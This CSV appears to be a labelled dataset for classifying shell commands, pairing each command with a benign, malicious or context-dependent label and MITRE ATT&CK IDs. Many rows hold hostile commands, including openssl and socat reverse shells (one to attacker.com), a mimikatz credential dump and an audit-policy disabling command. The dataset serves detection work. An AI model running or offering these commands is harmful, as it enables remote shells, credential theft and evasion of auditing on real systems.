command,label,original_label,mitre_id
ssh -fN -L 8080:192.168.1.1:80 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:5432 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:9002,Malicious,Synthetic,Synthetic
fprintd-list,Benign,Benign,Benign
rg --files | rg pattern,Benign,Benign,Benign
assimp listexport,Benign,Benign,Benign
tcpdump -i enp0s3 port 445,Context_Dependent,Synthetic,Synthetic
ssh -w 0:0 svcuser@10.0.0.10,Context_Dependent,Synthetic,Synthetic
cat file | column -c 80,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
wasm-opt -Oz input.wasm [-o|--output] output.wasm,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.5:80 jenkins@192.168.1.100,Context_Dependent,Synthetic,Synthetic
cryptsetup open --allow-discards /dev/sdXY mapping_name,Benign,Benign,Benign
julia [-e|--eval] 'for x in ARGS; println(x); end' arguments,Benign,Benign,Benign
"find /usr/ports/ -name Makefile\* -mindepth 3 -maxdepth 3 -exec egrep ""NOPORTDOCS|NOPORTEXAMPLES"" '{}' '+' | wc -l",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:8888,Malicious,Synthetic,Synthetic
macchanger [-p|--permanent] interface,Benign,Benign,Benign
gdal_translate -of JPEG path/to/input.tif path/to/output.jpeg,Benign,Benign,Benign
vet scan [-D|--directory] .,Benign,Benign,Benign
zlib,Malicious,Malicious,T1132
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:8443,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:192.168.1.25:110 operator@10.20.30.40,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.5:110 user@192.168.1.254,Context_Dependent,Synthetic,Synthetic
git archive [-o|--output] path/to/file.tar HEAD:path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
for /d %variable in (path\to\directory1.ext path\to\directory2.ext ...) do (echo Loop is executed),Benign,Benign,Benign
Get{Extension/Filter}Version,Malicious,Malicious,T1505
phploc path/to/directory,Benign,Benign,Benign
"git ignore-io item_a,item_b,...",Benign,Benign,Benign
"find . -type d -depth 1 -print0 | xargs -0 sh -c 'for dir; do pushd ""$dir"" && latexmk -c && popd; done' fnord",Benign,Benign,Benign
"while :; do continue; echo ""This will never be reached""; done",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:4445,Malicious,Synthetic,Synthetic
lxc-top [-s|--sort] n|c|b|m|k,Benign,Benign,Benign
pdfgrep [-m|--max-count] 3 [-i|--ignore-case] '^file_name' file.pdf,Benign,Benign,Benign
terraform apply -destroy,Benign,Benign,Benign
gpg-card url,Benign,Benign,Benign
trafilatura [-u|--URL] url --with-comments,Benign,Benign,Benign
"func_name() { echo ""Function contents here""; }",Benign,Benign,Benign
chown -R andrewr:andrewr *,Benign,Benign,Benign
sudo aureport [-l|--login],Benign,Benign,Benign
dolphin --new-window,Benign,Benign,Benign
linode-cli object-storage keys create --label label,Benign,Benign,Benign
pio system prune --dry-run,Benign,Benign,Benign
opencode uninstall [-f|--force],Benign,Benign,Benign
yes yes | sed -e 5s/yes/no/ -e 5q,Benign,Benign,Benign
git sed 'find_text' 'replace_text',Benign,Benign,Benign
"echo ""### END INIT INFO"" >> /etc/init.d/T1543.002",Malicious,Malicious,T1543
cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*,Malicious,Malicious,T1567
pass otp append [-s|--secret] [-i|--issuer] issuer_name [-a|--account] account_name path/to/pass,Benign,Benign,Benign
gpasswd [-a|--add] user group,Benign,Benign,Benign
"Import-Module ""$ps_module""",Malicious,Malicious,T1048
kk_KZ,Context_Dependent,Malicious,T1614
k3d cluster delete cluster_name,Benign,Benign,Benign
pbmclean -black|white path/to/image.pbm > path/to/output.pbm,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:8081,Malicious,Synthetic,Synthetic
dvc destroy [-f|--force],Benign,Benign,Benign
find -maxdepth 1 -type d,Benign,Benign,Benign
dillo path/to/file_or_directory,Benign,Benign,Benign
"find . -not -name ""*.exe"" -not -name ""*.dll"" -not -type d",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.10:110 svcuser@192.168.1.1,Context_Dependent,Synthetic,Synthetic
abrt-cli remove problem_id,Benign,Benign,Benign
tmt run [-a|--all] provision [-h|--how] container [-i|--image] fedora:rawhide,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.1:445 postgres@support.internal,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
ab -n 100 -c 10 url,Benign,Benign,Benign
twopi -T format -O path/to/input.gv,Benign,Benign,Benign
pnmpad [-l|-left] 100 [-ri|-right] 150 [-t|-top] 123 [-bo|-bottom] 456 path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
systemctl is-enabled sshd,Context_Dependent,Synthetic,Synthetic
"cat $(find src/js -type f -name ""*.js"" -printf ""%d\t%p\n"" | sort -n | sed -e ""s|[0-9]*\t||"")>min.js",Benign,Benign,Benign
"auditpol /set /category:""Logon/Logoff"" /success:disable /failure:disable",Malicious,Malicious,T1562
opencode stats,Benign,Benign,Benign
ssh -w 0:0 support@target.com,Context_Dependent,Synthetic,Synthetic
"echo ""Description=Atomic Red Team Systemd Service"" >> $systemd_service_path/$systemd_service_file",Malicious,Malicious,T1543
"cowsay ""hello, world""",Benign,Benign,Benign
gio launch path/to/file.desktop,Benign,Benign,Benign
echo End of Golden Ticket attack,Malicious,Malicious,T1558
"zformat -f variable ""%10c"" c:hello",Benign,Benign,Benign
find whatever -print0 | xargs -0 command,Benign,Benign,Benign
traceroute -n 10.0.0.50,Context_Dependent,Synthetic,Synthetic
picotool reboot,Benign,Benign,Benign
"strace -f -e trace=open,read,write -p 9001",Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
vcsh write-gitignore repository_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4445,Malicious,Synthetic,Synthetic
"find . -name ""*.txt"" -print0 |xargs -0 du -ch | tail -n1",Benign,Benign,Benign
nxc vnc 192.168.178.2 [-u|--username] username [-p|--password] password --screenshot --screentime 10,Benign,Benign,Benign
"find /home/*/public_html/ -type f -iwholename ""*/wp-includes/version.php"" -exec grep -H ""\$wp_version ="" {} \;",Context_Dependent,Benign,Benign
cat xx01,Context_Dependent,Malicious,T1005
doggo MX codeberg.org @1.1.1.2,Benign,Benign,Benign
tail -f file | grep --line-buffered my_pattern,Benign,Benign,Benign
"socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane",Malicious,Malicious,T1059
"find / -path ""*/Google/Chrome/*/Bookmarks"" -exec echo {} >> $output_file \;",Context_Dependent,Malicious,T1217
ssh -fN -L 8080:192.168.1.1:1433 svcuser@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.100:443 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.50:80 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
comm -12 ignore.txt input.txt,Benign,Benign,Benign
csv2tsv -c';' path/to/input_csv,Benign,Benign,Benign
rsync -rtuv /path/to/dir_b/* /path/to/dir_a,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:4445,Malicious,Synthetic,Synthetic
foreach($queue in $queues) {,Context_Dependent,Malicious,T1619
find . -maxdepth 1 -not -iwholename '*Video',Benign,Benign,Benign
gzip -dc /usr/src/redhat/SOURCES/source-one.tar.gz | tar -xvvf -,Benign,Benign,Benign
taskkill,Malicious,Malicious,T1489
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:53,Malicious,Synthetic,Synthetic
az advisor recommendation list,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:445 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
"find . -type f -and -iname ""*.deb""",Benign,Benign,Benign
0 3534848 linear /dev/loop0 94208,Malicious,Malicious,T1059
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:9002,Malicious,Synthetic,Synthetic
sc_tracediff -n path/to/file1.warts path/to/file2.warts,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.5:80 svcuser@10.0.0.50,Context_Dependent,Synthetic,Synthetic
"zenity --forms --add-entry ""name_label"" --add-password ""password_label"" --separator "";""",Benign,Benign,Benign
else: import urllib as r,Malicious,Malicious,T1105
ssh -w 0:0 user@10.0.0.10,Context_Dependent,Synthetic,Synthetic
systemd-cgls cpu|memory|io,Benign,Benign,Benign
tcpdump -i ens33 -c 100,Context_Dependent,Synthetic,Synthetic
Security Settings\Local Policies\Audit Policy,Malicious,Malicious,T1562
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:3389,Malicious,Synthetic,Synthetic
aws-google-auth [-u|--username] example@example.com [-I|--idp-id] $GOOGLE_IDP_ID [-S|--sp-id] $GOOGLE_SP_ID [-d|--duration] 3600,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:995,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.100:8443 svcuser@cdn-sync.bad,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
asnmap [-a|-asn] AS394161 [-c|-csv] -silent,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:143 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:53 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:8081,Malicious,Synthetic,Synthetic
pw-dot [-o|--output] - [-d|--detail],Benign,Benign,Benign
find /mnt/naspath -mtime 0 -print0 | du --files0-from=- -hc | tail -n1 >> /tmp/size.log,Benign,Benign,Benign
ci path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:9002,Malicious,Synthetic,Synthetic
"find . -name ""*.fq"" -print0 | xargs -0 -n 1 fastqc",Benign,Benign,Benign
tracepath 10.10.10.25,Context_Dependent,Synthetic,Synthetic
abspath=$(readlink -f $path),Benign,Benign,Benign
iproxy --udid device_udid local_port:device_port,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.10:9090 user@172.20.10.8,Context_Dependent,Synthetic,Synthetic
find $path -type d,Benign,Benign,Benign
robo list,Benign,Benign,Benign
stat /etc/shells,Context_Dependent,Synthetic,Synthetic
ng add package [-d|--dry-run],Benign,Benign,Benign
docker network inspect network_name1 network_name2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:4445,Malicious,Synthetic,Synthetic
npm [c|config] get key,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:9001,Malicious,Synthetic,Synthetic
markdown2pdf [-s|--string] markdown_text [-o|--output] path/to/output_file.pdf,Benign,Benign,Benign
rbc.close();,Malicious,Malicious,T1105
finger,Context_Dependent,Benign,Benign
hive --hiveconf conf_name=conf_value,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:4445,Malicious,Synthetic,Synthetic
"local -r variable=""value""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:4445,Malicious,Synthetic,Synthetic
seq 10,Benign,Benign,Benign
pwgen 20,Benign,Benign,Benign
conda run [-p|--prefix] path/to/env command,Benign,Benign,Benign
carthage update,Benign,Benign,Benign
uv remove --optional extra_name package,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
squirrel.exe --update {REMOTEURL},Malicious,Malicious,T1218
C:\User\1\,Malicious,Malicious,T1074
az logicapp start [-n|--name] name [-g|--resource-group] resource_group,Benign,Benign,Benign
find . -type d -name 'test' -exec rm -rf {} \;,Benign,Benign,Benign
ntpdate -a x -k /path/to/input-file -d localhost,Context_Dependent,Malicious,T1005
Compress-Archive,Malicious,Malicious,T1560
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:192.168.1.1:6379 jenkins@172.20.10.8,Context_Dependent,Synthetic,Synthetic
sg run --pattern 'useState<number>($A)' --rewrite 'useState($A)' --lang typescript,Benign,Benign,Benign
gh [at|attestation] download path/to/artifact.bin [-R|--repo] owner/repository,Benign,Benign,Benign
ssh -w 0:0 backup@files.company.local,Context_Dependent,Synthetic,Synthetic
blkdiscard [-s|--secure] /dev/device,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:4444,Malicious,Synthetic,Synthetic
gfortran -S path/to/source.f90,Benign,Benign,Benign
qgis,Benign,Benign,Benign
fsck -q /dev/sdX,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
find -name 'messages.*' -exec grep -Iw uint {} + | grep -Ev '.svn|.git|.anythingElseIwannaIgnore',Benign,Benign,Benign
"""$mimikatz_exe"" ""sekurlsa::minidump $input_file"" ""sekurlsa::logonpasswords full"" exit",Malicious,Malicious,T1003
tcpdump -i eth0 port 53,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:192.168.1.1:80 backup@172.20.10.8,Context_Dependent,Synthetic,Synthetic
print path\to\file,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.10:3306 user@10.0.0.10,Context_Dependent,Synthetic,Synthetic
tail -20 /etc/yum.conf,Context_Dependent,Synthetic,Synthetic
winget [ls|list] [-s|--source] winget,Benign,Benign,Benign
sockstat -jv,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:22,Malicious,Synthetic,Synthetic
"find ""$1"" -type f | egrep -v '\.bz2' | xargs bzip2 -9 &",Benign,Benign,Benign
"strace -f -e trace=open,read,write -p 1234",Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:1433,Malicious,Synthetic,Synthetic
qalc [-t|--terse],Benign,Benign,Benign
/Network/Library/Keychains/,Malicious,Malicious,T1555
openssl s_client -quiet -connect 192.168.1.1:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
tcpdump -i any -n -c 9001,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8080,Malicious,Synthetic,Synthetic
curl -s http://search.twitter.com/search.json?q=node.js | json,Benign,Benign,Benign
touch $file_to_setcap,Malicious,Malicious,T1548
aws --no-sign-request s3 cp --recursive s3://$s3_bucket_name /tmp/$s3_bucket_name,Malicious,Malicious,T1530
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
git brv,Benign,Benign,Benign
cipher /d:path\to\file_or_directory,Benign,Benign,Benign
find / -noleaf -wholename '/proc' -prune -o -wholename '/sys' -prune -o -wholename '/dev' -prune -o -perm -2 ! -type l ! -type s ! \( -type d -perm -1000 \) -print,Context_Dependent,Benign,Benign
aws lightsail get-instances,Benign,Benign,Benign
flutter doctor,Benign,Benign,Benign
fast,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:993,Malicious,Synthetic,Synthetic
